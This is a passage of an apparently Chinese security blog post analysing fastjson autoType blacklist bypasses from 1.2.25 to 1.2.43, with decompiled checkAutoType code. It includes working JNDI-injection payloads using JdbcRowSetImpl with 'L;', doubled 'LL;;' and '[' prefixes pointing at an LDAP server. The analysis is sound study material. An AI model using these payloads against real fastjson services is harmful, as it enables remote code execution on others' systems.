</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_25_to_41</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;: \&#34;Lcom.sun.rowset.JdbcRowSetImpl;\&#34;, \&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/52a727d0b6a97c626d25be57c2408fbe.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/52a727d0b6a97c626d25be57c2408fbe.png, https://img.mi3aka.eu.org/2023/02/52a727d0b6a97c626d25be57c2408fbe.png 1.5x, https://img.mi3aka.eu.org/2023/02/52a727d0b6a97c626d25be57c2408fbe.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/52a727d0b6a97c626d25be57c2408fbe.png"
        title="https://img.mi3aka.eu.org/2023/02/52a727d0b6a97c626d25be57c2408fbe.png" /></p>
<h3 id="checkautotype分析">checkAutoType分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.parser.ParserConfig
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//开启autoTypeSupport后,对白名单和黑名单进行校验,而&#34;Lcom.sun.rowset.JdbcRowSetImpl;&#34;不在黑名单范围内,因此进入后续的TypeUtils.loadClass流程
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">acceptList</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">accept</span> <span class="o">=</span> <span class="n">acceptList</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">accept</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">denyList</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">deny</span> <span class="o">=</span> <span class="n">denyList</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="n">deny</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>TypeUtils.loadClass</code>流程与前面<code>1.2.24</code>分析的流程一致</p>
<p>由于在<code>TypeUtils.loadClass</code>中会对<code>classname</code>开头的<code>L</code>和结尾的<code>;</code>进行去除后再进行loadclass,因此利用这一点进行绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;L&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">className</span><span class="o">.</span><span class="na">endsWith</span><span class="o">(</span><span class="s">&#34;;&#34;</span><span class="o">))</span> <span class="o">{</span><span class="c1">//去除开头的L和结尾的;,后续版本可用于绕过
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">String</span> <span class="n">newClassName</span> <span class="o">=</span> <span class="n">className</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">loadClass</span><span class="o">(</span><span class="n">newClassName</span><span class="o">,</span> <span class="n">classLoader</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="1242">1.2.42</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">1.2.42版本将黑名单denyList替换成了denyHashCodes,fastjson使用哈希黑名单来代替之前的明文黑名单来防止被绕过,增加了绕过的困难程度
</span></span></span><span class="line"><span class="cl"><span class="cm">checkAutoType函数会从className中将com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类提取出来,然后把前后的字符L和;都去掉,然后再进行哈希黑名单过滤
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">使用双写绕过
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_42</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;: \&#34;LLcom.sun.rowset.JdbcRowSetImpl;;\&#34;, \&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/108b078e3931bd9255973ee3b1857fb9.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/108b078e3931bd9255973ee3b1857fb9.png, https://img.mi3aka.eu.org/2023/02/108b078e3931bd9255973ee3b1857fb9.png 1.5x, https://img.mi3aka.eu.org/2023/02/108b078e3931bd9255973ee3b1857fb9.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/108b078e3931bd9255973ee3b1857fb9.png"
        title="https://img.mi3aka.eu.org/2023/02/108b078e3931bd9255973ee3b1857fb9.png" /></p>
<h3 id="checkautotype分析-1">checkAutoType分析</h3>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/f30652a50503c14e7a9a07a3d415a780.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/f30652a50503c14e7a9a07a3d415a780.png, https://img.mi3aka.eu.org/2023/02/f30652a50503c14e7a9a07a3d415a780.png 1.5x, https://img.mi3aka.eu.org/2023/02/f30652a50503c14e7a9a07a3d415a780.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/f30652a50503c14e7a9a07a3d415a780.png"
        title="https://img.mi3aka.eu.org/2023/02/f30652a50503c14e7a9a07a3d415a780.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">BASIC</span> <span class="o">=</span> <span class="mh">0xcbf29ce484222325L</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">PRIME</span> <span class="o">=</span> <span class="mh">0x100000001b3L</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((((</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span> <span class="o">==</span> <span class="mh">0x9198507b5af98f0L</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">className</span> <span class="o">=</span> <span class="n">className</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">);</span><span class="c1">//将payload中双写的L和;去掉一个
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h3</span> <span class="o">=</span> <span class="o">(((((</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">2</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span><span class="c1">//白名单
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">denyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//黑名单
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">                    1.2.42的处理方法相当于逐字符拼接后计算哈希,然后和黑名单中的哈希进行匹配
</span></span></span><span class="line"><span class="cl"><span class="cm">                    */</span>
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//完成黑名单检测后进行loadclass,loadClass中对L和;的处理和前面的一致
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="1243">1.2.43</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">1.2.43版本对双写L和;进行检测,但loadClass函数中的className还有对[的特殊处理,所以可以绕过
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_43</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;: \&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{, \&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;, \&#34;autoCommit\&#34;:true}&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/e4ce02b20a36bd33e2f27608c4f4fb81.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/e4ce02b20a36bd33e2f27608c4f4fb81.png, https://img.mi3aka.eu.org/2023/02/e4ce02b20a36bd33e2f27608c4f4fb81.png 1.5x, https://img.mi3aka.eu.org/2023/02/e4ce02b20a36bd33e2f27608c4f4fb81.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/e4ce02b20a36bd33e2f27608c4f4fb81.png"
        title="https://img.mi3aka.eu.org/2023/02/e4ce02b20a36bd33e2f27608c4f4fb81.png" /></p>
<h3 id="checkautotype分析-2">checkAutoType分析</h3>
<p><code>1.2.43</code>版本的<code>checkAutoType</code>函数针对双写L和;的情况做出限制</p>
<p>但在前面对<code>TypeUtils.loadClass</code>的分析可以知道,fastjson处理对<code>L;</code>特殊处理外,还对<code>[</code>进行了特殊处理</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/463d29435f681af220870a2818a3f4a9.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/463d29435f681af220870a2818a3f4a9.png, https://img.mi3aka.eu.org/2023/02/463d29435f681af220870a2818a3f4a9.png 1.5x, https://img.mi3aka.eu.org/2023/02/463d29435f681af220870a2818a3f4a9.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/463d29435f681af220870a2818a3f4a9.png"
        title="https://img.mi3aka.eu.org/2023/02/463d29435f681af220870a2818a3f4a9.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">BASIC</span> <span class="o">=</span> <span class="mh">0xcbf29ce484222325L</span><span class="o">;</span>
